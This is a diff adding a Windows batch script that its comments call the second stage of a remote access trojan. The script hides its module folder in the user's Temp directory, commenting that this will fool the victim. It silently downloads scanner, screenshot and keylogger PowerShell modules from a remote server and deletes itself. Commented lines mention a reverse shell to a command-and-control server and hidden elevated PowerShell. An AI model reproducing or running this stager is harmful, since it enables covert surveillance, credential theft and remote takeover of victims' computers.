@@ -1,0 +1,30 @@
+@REM second stage of RAT
+@REM created by : Moussa
+
+@REM variables
+set "FILE_NAME=phase2.cmd"
+set "INITIAL_PATH=%cd%"
+set "ENV_PATH=C:\Users\%username%\AppData\Local\Temp"
+set "modulesName=scanner.ps1 screenshot.ps1 keylogger.ps1"
+
+@REM Bypass Exectuion Policy to be able to execute our different modules
+
+
+
+@REM create folders to store our modules (it is ideal to give a random directory name to fool the victim)
+cd %ENV_PATH%
+mkdir modules
+cd modules
+
+@REM download modules from our local web server
+(for %%m in (%modulesName%) do (
+   powershell -WindowStyle Hidden -c "Invoke-WebRequest -Uri http://10.0.0.212/%%m -Outfile .\modules\%%m"
+))
+
+@REM create a reverse shell connection back to ou command and control center
+
+@REM remove stage2 file
+del "%INITIAL_PATH%\%FILE_NAME%"
+
+@REM runas /noprofile "powershell .\scanner.ps1"
+@REM powershell start-process powershell -WindowStyle hidden -verb runas
